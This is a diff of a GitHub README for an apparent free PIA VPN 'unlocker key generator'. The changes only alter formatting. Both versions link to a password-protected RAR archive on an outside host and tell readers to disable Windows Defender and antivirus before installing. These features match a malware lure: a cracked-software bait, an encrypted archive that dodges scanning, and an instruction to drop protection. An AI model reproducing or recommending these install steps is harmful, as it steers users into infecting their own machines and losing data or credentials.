@@ -2,15 +2,15 @@
 
 ![PIA1](https://github.com/BeastJJ/free-PIA-VPN-unlocker-key-generator-utility/assets/155189688/d3858398-f183-4d9d-a546-06854d0cb97e)
 
-# 🖥️[𝐈𝐍𝐒𝐓𝐀𝐋𝐋](https://boogi.ma/temp/GitLauncher.rar)
+# 🖥️[INSTALL](https://boogi.ma/temp/GitLauncher.rar)
 
-# 🔐 𝐏𝐀𝐒𝐒: 2024
+# 🔐 PASS: 2024
 
-🟩If you can’t install utility, you need to:
+***🟩If you can’t install utility, you need to:***
 
-🟩Disable Windows DEF/AV
+***🟩Disable Windows DEF/AV***
 
-🟩Download WinRar on your computer.
+***🟩Download WinRar on your computer.***
 
 # 📌Description
 
